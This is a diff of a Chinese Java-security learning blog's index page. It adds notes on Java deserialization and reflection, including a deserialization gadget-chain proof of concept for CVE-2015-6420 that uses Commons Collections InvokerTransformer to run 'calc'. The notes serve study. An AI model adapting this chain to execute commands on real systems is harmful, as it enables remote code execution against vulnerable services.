+<img src="/2022/03/28/java%E5%8F%8D%E5%BA%8F%E5%8C%96%EF%BC%88CommonsBeanutils%EF%BC%89%E7%AC%94%E8%AE%B0/9.png" class="" title="9.png">
+<p>图九</p>
+<img src="/2022/03/28/java%E5%8F%8D%E5%BA%8F%E5%8C%96%EF%BC%88CommonsBeanutils%EF%BC%89%E7%AC%94%E8%AE%B0/10.png" class="" title="10.png">
+<p>图十</p>
+<img src="/2022/03/28/java%E5%8F%8D%E5%BA%8F%E5%8C%96%EF%BC%88CommonsBeanutils%EF%BC%89%E7%AC%94%E8%AE%B0/11.png" class="" title="11.png">
+<p>图十一</p>
+<img src="/2022/03/28/java%E5%8F%8D%E5%BA%8F%E5%8C%96%EF%BC%88CommonsBeanutils%EF%BC%89%E7%AC%94%E8%AE%B0/12.png" class="" title="12.png">
+<p>图十二</p>
+<img src="/2022/03/28/java%E5%8F%8D%E5%BA%8F%E5%8C%96%EF%BC%88CommonsBeanutils%EF%BC%89%E7%AC%94%E8%AE%B0/13.png" class="" title="13.png">
+<p>图十三</p>
+<img src="/2022/03/28/java%E5%8F%8D%E5%BA%8F%E5%8C%96%EF%BC%88CommonsBeanutils%EF%BC%89%E7%AC%94%E8%AE%B0/14.png" class="" title="14.png">
+<p>图十四</p>
+<img src="/2022/03/28/java%E5%8F%8D%E5%BA%8F%E5%8C%96%EF%BC%88CommonsBeanutils%EF%BC%89%E7%AC%94%E8%AE%B0/15.png" class="" title="15.png">
+<p>图十五</p>
+<img src="/2022/03/28/java%E5%8F%8D%E5%BA%8F%E5%8C%96%EF%BC%88CommonsBeanutils%EF%BC%89%E7%AC%94%E8%AE%B0/16.png" class="" title="16.png">
+<p>图十六</p>
+<img src="/2022/03/28/java%E5%8F%8D%E5%BA%8F%E5%8C%96%EF%BC%88CommonsBeanutils%EF%BC%89%E7%AC%94%E8%AE%B0/17.png" class="" title="17.png">
+<p>图十七</p>
+<p>参考：<br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html">https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/120007644">https://blog.csdn.net/rfrder/article/details/120007644</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_34066347/article/details/89827676">https://blog.csdn.net/weixin_34066347/article/details/89827676</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/119990475?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164802921516780366514525%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=164802921516780366514525&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-13-119990475.nonecase&amp;utm_term=TemplatesImpl&amp;spm=1018.2226.3001.4450">https://blog.csdn.net/rfrder/article/details/119990475?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164802921516780366514525%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=164802921516780366514525&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-13-119990475.nonecase&amp;utm_term=TemplatesImpl&amp;spm=1018.2226.3001.4450</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/121236409?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164802835116780271950552%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=164802835116780271950552&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-121236409.nonecase&amp;utm_term=rome&amp;spm=1018.2226.3001.4450">https://blog.csdn.net/rfrder/article/details/121236409?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164802835116780271950552%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=164802835116780271950552&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-121236409.nonecase&amp;utm_term=rome&amp;spm=1018.2226.3001.4450</a><br><a target="_blank" rel="noopener" href="https://github.com/la0t0ng/d3ctf2022-shorter">https://github.com/la0t0ng/d3ctf2022-shorter</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/03/28/java%E5%8F%8D%E5%BA%8F%E5%8C%96%EF%BC%88CommonsBeanutils%EF%BC%89%E7%AC%94%E8%AE%B0/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
     <article id="post-Java反序列化" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -187,9 +444,28 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>java没有servializable这样的序列化函数<br>要实现仅仅需要继承Servializable这个模块，然后写入流（ByteArrayOutputStream和ObjectOutputStream）即可，激活需要读出流（ByteArrayInputStream和ObjectInputStream）<br>另外就是一般喜欢调用的计算器的指令是“calc”（一开始看别人代码演示弹出计算器，死命找哪里调用都没找到，反而把“calc”这样的字符串当成填充字符略过了……）</p>
+        <p>一开始跟着这个（<a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/120007644">https://blog.csdn.net/rfrder/article/details/120007644</a> ）,死活也找不到哪里调用了计算器，后来才发现，它把利用函数简化了，完整的是：<a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/121236409">https://blog.csdn.net/rfrder/article/details/121236409</a></p>
+<p>java没有servializable这样的序列化函数<br>要实现仅仅需要继承Servializable这个模块，然后写入流（ByteArrayOutputStream和ObjectOutputStream）即可，激活需要读出流（ByteArrayInputStream和ObjectInputStream）<br>另外就是一般喜欢调用的计算器的指令是“calc”（一开始看别人代码演示弹出计算器，死命找哪里调用都没找到，反而把“calc”这样的字符串当成填充字符略过了……）</p>
 <p>演示用例：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line">class User implements Serializable&#123;</span><br><span class="line">    private String name;</span><br><span class="line">    public String cmd;</span><br><span class="line">    public void setName(String name)&#123;this.name&#x3D;name;&#125;</span><br><span class="line">    public  String getName()&#123;return name;&#125;</span><br><span class="line"></span><br><span class="line">    public void setCmd(String cmd) &#123;this.cmd &#x3D; cmd;&#125;</span><br><span class="line"></span><br><span class="line">    private void readObject(java.io.ObjectInputStream stream) throws Exception&#123;</span><br><span class="line">        stream.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class SerialiableTest&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        User user&#x3D;new User();</span><br><span class="line">        user.setName(&quot;DeelMind&quot;);</span><br><span class="line">        user.setCmd(&quot;calc&quot;);</span><br><span class="line"></span><br><span class="line">        byte[] serializeData&#x3D;serialize(user);</span><br><span class="line">        &#x2F;&#x2F;打印</span><br><span class="line">        FileOutputStream fout &#x3D; new FileOutputStream(&quot;user.bin&quot;);</span><br><span class="line">        fout.write(serializeData);</span><br><span class="line">        &#x2F;&#x2F;</span><br><span class="line">        fout.close();</span><br><span class="line">        User user2 &#x3D; (User) unserialize(serializeData);</span><br><span class="line">        System.out.println(user2.getName());</span><br><span class="line">    &#125;</span><br><span class="line">    public static byte[] serialize(final Object obj) throws Exception&#123;</span><br><span class="line">        ByteArrayOutputStream btout &#x3D; new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream object &#x3D; new ObjectOutputStream(btout);</span><br><span class="line">        object.writeObject(obj);</span><br><span class="line">        return btout.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    public static Object unserialize(final byte[] serialized)throws Exception&#123;</span><br><span class="line">        ByteArrayInputStream btin &#x3D; new ByteArrayInputStream(serialized);</span><br><span class="line">        &#x2F;&#x2F;打印</span><br><span class="line">        System.out.println(btin);</span><br><span class="line">        &#x2F;&#x2F;</span><br><span class="line">        ObjectInputStream objIn &#x3D; new ObjectInputStream(btin);</span><br><span class="line">        return objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>反射机制：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">class People &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    public People(String name)&#123;this.name&#x3D;name;&#125;</span><br><span class="line">    public String getName()&#123;return name;&#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        Class PeopleClass &#x3D; Class.forName(&quot;People&quot;);&#x2F;&#x2F;获取类</span><br><span class="line">        Constructor constructor &#x3D; PeopleClass.getConstructor(String.class);&#x2F;&#x2F;获取构造函数</span><br><span class="line">        Object p &#x3D;  constructor.newInstance(&quot;DeelMind&quot;);</span><br><span class="line">        &#x2F;&#x2F;System.out.println(p.getName());</span><br><span class="line">        Method method &#x3D; PeopleClass.getMethod(&quot;getName&quot;);&#x2F;&#x2F;获取方法</span><br><span class="line">        System.out.println(method.invoke(p));&#x2F;&#x2F;调用方法并传参</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;效果等同于：</span><br><span class="line">        &#x2F;&#x2F;People p &#x3D; new People(&quot;aaa&quot;);</span><br><span class="line">        &#x2F;&#x2F;p.getName();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;相当于：</span><br><span class="line">        &#x2F;&#x2F;正常new：直接调用原内容（代码），进行编译</span><br><span class="line">        &#x2F;&#x2F;反射：先将原内容编译成class文件，然后把class拆出来，反编译后再调用</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在反序化中的应用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line">class User implements Serializable&#123;</span><br><span class="line">    private String name;</span><br><span class="line">    public String cmd;</span><br><span class="line">    public void setName(String name)&#123;this.name&#x3D;name;&#125;</span><br><span class="line">    public  String getName()&#123;return name;&#125;</span><br><span class="line"></span><br><span class="line">    public void setCmd(String cmd) &#123;this.cmd &#x3D; cmd;&#125;</span><br><span class="line"></span><br><span class="line">    private void readObject(java.io.ObjectInputStream stream) throws Exception&#123;</span><br><span class="line">&#x2F;&#x2F;        stream.defaultReadObject();</span><br><span class="line">&#x2F;&#x2F;        Runtime.getRuntime().exec(cmd);</span><br><span class="line">        Class runtimeClass &#x3D; Class.forName(&quot;java.lang.Runtime&quot;);&#x2F;&#x2F;获取类</span><br><span class="line">        Object runtime &#x3D; runtimeClass.getMethod(&quot;getRuntime&quot;).invoke(null);&#x2F;&#x2F;获取方法</span><br><span class="line">        runtimeClass.getMethod(&quot;exec&quot;,String.class).invoke(runtime,&quot;notepad&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class SerialiableTest&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        User user&#x3D;new User();</span><br><span class="line">        user.setName(&quot;DeelMind&quot;);</span><br><span class="line">        user.setCmd(&quot;calc&quot;);</span><br><span class="line"></span><br><span class="line">        byte[] serializeData&#x3D;serialize(user);</span><br><span class="line">        &#x2F;&#x2F;打印</span><br><span class="line">        FileOutputStream fout &#x3D; new FileOutputStream(&quot;user.bin&quot;);</span><br><span class="line">        fout.write(serializeData);</span><br><span class="line">        &#x2F;&#x2F;</span><br><span class="line">        fout.close();</span><br><span class="line">        User user2 &#x3D; (User) unserialize(serializeData);</span><br><span class="line">        System.out.println(user2.getName());</span><br><span class="line">    &#125;</span><br><span class="line">    public static byte[] serialize(final Object obj) throws Exception&#123;</span><br><span class="line">        ByteArrayOutputStream btout &#x3D; new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream object &#x3D; new ObjectOutputStream(btout);</span><br><span class="line">        object.writeObject(obj);</span><br><span class="line">        return btout.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    public static Object unserialize(final byte[] serialized)throws Exception&#123;</span><br><span class="line">        ByteArrayInputStream btin &#x3D; new ByteArrayInputStream(serialized);</span><br><span class="line">        &#x2F;&#x2F;打印</span><br><span class="line">        System.out.println(btin);</span><br><span class="line">        &#x2F;&#x2F;</span><br><span class="line">        ObjectInputStream objIn &#x3D; new ObjectInputStream(btin);</span><br><span class="line">        return objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>runtime有个exec指令可以用</p>
+<p>看一下runtime的内部</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private static Runtime currentRuntime &#x3D; new Runtime();</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public static Runtime getRuntime() &#123;</span><br><span class="line">    return currentRuntime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public Process exec(String command) throws IOException &#123;</span><br><span class="line">    return exec(command, null, null);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以先调用getRuntime()会获得返回值是new了这个类，然后调用这个类的exec，传参就行</p>
+<p>获取私有变量内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">class People &#123;</span><br><span class="line">    private String name&#x3D;&quot;123&quot;;</span><br><span class="line">    public People(String name)&#123;this.name&#x3D;name;&#125;</span><br><span class="line">&#x2F;&#x2F;    public String getName()&#123;return name;&#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">&#x2F;&#x2F;        Class PeopleClass &#x3D; Class.forName(&quot;People&quot;);&#x2F;&#x2F;获取类</span><br><span class="line">&#x2F;&#x2F;        Constructor constructor &#x3D; PeopleClass.getConstructor(String.class);&#x2F;&#x2F;获取构造函数</span><br><span class="line">&#x2F;&#x2F;        Object p &#x3D;  constructor.newInstance(&quot;DeelMind&quot;);</span><br><span class="line">&#x2F;&#x2F;        &#x2F;&#x2F;System.out.println(p.getName());</span><br><span class="line">&#x2F;&#x2F;        Method method &#x3D; PeopleClass.getMethod(&quot;getName&quot;);&#x2F;&#x2F;获取方法</span><br><span class="line">&#x2F;&#x2F;        System.out.println(method.invoke(p));&#x2F;&#x2F;调用方法并传参</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;效果等同于：</span><br><span class="line">        &#x2F;&#x2F;People p &#x3D; new People(&quot;aaa&quot;);</span><br><span class="line">        &#x2F;&#x2F;p.getName();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;相当于：</span><br><span class="line">        &#x2F;&#x2F;正常new：直接调用原内容（代码），进行编译</span><br><span class="line">        &#x2F;&#x2F;反射：先将原内容编译成class文件，然后把class拆出来，反编译后再调用</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Class PeopleClass &#x3D; Class.forName(&quot;People&quot;);&#x2F;&#x2F;获取类</span><br><span class="line">        Field[] f &#x3D; PeopleClass.getDeclaredFields();</span><br><span class="line">        for(Field field:f)&#123;</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            System.out.println(field.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>例子：CVE-2015-6420<br>commons-collections-3.1.jar<br>1.导包：<br>2.com.deelmind.st.java</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">package com.deelmind;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.*;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Poc &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        Transformer[] transformers &#x3D; new Transformer[]&#123;</span><br><span class="line"></span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;</span><br><span class="line">                        String.class,Class[].class&#125;,new Object[]&#123;</span><br><span class="line">                                &quot;getRuntime&quot;,null</span><br><span class="line">                &#125;</span><br><span class="line">                ),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;</span><br><span class="line">                        Object.class,Object[].class&#125;,new Object[]&#123;</span><br><span class="line">                                null,null</span><br><span class="line">                &#125;</span><br><span class="line">                ),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;</span><br><span class="line">                    String.class&#125;,new Object[]&#123;</span><br><span class="line">                            &quot;calc&quot;</span><br><span class="line">                &#125;</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain &#x3D; new ChainedTransformer(transformers);</span><br><span class="line">        Map innermap &#x3D; new HashMap();</span><br><span class="line">        innermap.put(&quot;key&quot;,&quot;value&quot;);</span><br><span class="line">        Map outmap &#x3D; TransformedMap.decorate(innermap, null, chain);</span><br><span class="line">        Map.Entry onlyElement &#x3D; (Map.Entry) outmap.entrySet().iterator().next();</span><br><span class="line">        onlyElement.setValue(&quot;x&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
       
 
       
@@ -1735,220 +2011,9 @@ log4j.rootLogger=DEBUG,console,file
     </section>
   
   
-    <article id="post-JavaScript笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/01/18/JavaScript%E7%AC%94%E8%AE%B0/">JavaScript笔记</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2022/01/18/JavaScript%E7%AC%94%E8%AE%B0/" class="archive-article-date">
-  	<time datetime="2022-01-18T08:43:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-18</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>“js开发只用了十天”</p>
-<p>以后有时间补</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/01/18/JavaScript%E7%AC%94%E8%AE%B0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-Java注解与反射" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/01/18/Java%E6%B3%A8%E8%A7%A3%E4%B8%8E%E5%8F%8D%E5%B0%84/">Java注解与反射</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2022/01/18/Java%E6%B3%A8%E8%A7%A3%E4%B8%8E%E5%8F%8D%E5%B0%84/" class="archive-article-date">
-  	<time datetime="2022-01-18T04:20:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-18</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>框架基于注解和反射<br>（反射是框架的基础，但是纯听反射越听越迷，尽量听，实在不行学框架的时候再回来听一遍）</p>
-<p>注解：<br>1.@Override :重写<br>2.@FunctionalInterface :函数式接口<br>3.@Deprecated :废弃，不推荐使用<br>4.@SuppressWarn ：镇压警告（防止报“警告”）</p>
-<p>注解格式：@注释名(参数)</p>
-<p>可以通过反射机制对这些注解进行访问</p>
-<p>内置注解：<br>1.@Override :重写<br>2.@Deprecated :废弃，不推荐使用<br>3.@SuppressWarn ：镇压警告（防止报“警告”）</p>
-<p>元注解：（注解的注解）<br>1.@Target :描述注解的使用范围<br>2.@Retention :表示要在什么级别保存该注释信息，用于描述注解的生命周期（SOURCE&lt;CLASS&lt;RUNTIME）<br>3.@Documented :说明该注解被包含在javadoc中<br>4.@Inherited :说明子类可以继承父类中的该注解</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">定义一个注解</span><br><span class="line">&#x2F;&#x2F;Target 表示我们的注解可以用在哪些地方</span><br><span class="line">@Targe(value&#x3D;&#123;ElementType.METGOD,ElementType.TYPE&#125;)</span><br><span class="line">&#x2F;&#x2F;表示我们的注解在什么地方还有效</span><br><span class="line">&#x2F;&#x2F;SOURCE&lt;CLASS&lt;RUNTIME</span><br><span class="line">@Retention(calue&#x3D; REtentionPolicy.RUNTIME)</span><br><span class="line">&#x2F;&#x2F;Documented 说明该注解被生成在javadoc中</span><br><span class="line">@Documented</span><br><span class="line">&#x2F;&#x2F;Inherited 说明子类可以继承父类中的该注解</span><br><span class="line">@Inherited</span><br></pre></td></tr></table></figure>
-
-<p>自定义注解：<br>@interface</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@Targe(value&#x3D;&#123;ElementType.METGOD,ElementType.TYPE&#125;)</span><br><span class="line">@Retention(calue&#x3D; REtentionPolicy.RUNTIME)</span><br><span class="line">@interface MyAnnotation2&#123;</span><br><span class="line">	&#x2F;&#x2F;注解的单数：注解类型 参数名() default 默认值;  （如果不写默认值就需要在注解的时候填上值）</span><br><span class="line">	String name() default &quot;&quot;;</span><br><span class="line">	int age() default 0;</span><br><span class="line">	int id() default -1;&#x2F;&#x2F;如果默认值为-1，代表不存在（返回-1）</span><br><span class="line">	String[] schools() default &#123;&quot;西部&quot;,&quot;大学&quot;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>反射：<br>Reflection<br>（取得类的任何内部信息）</p>
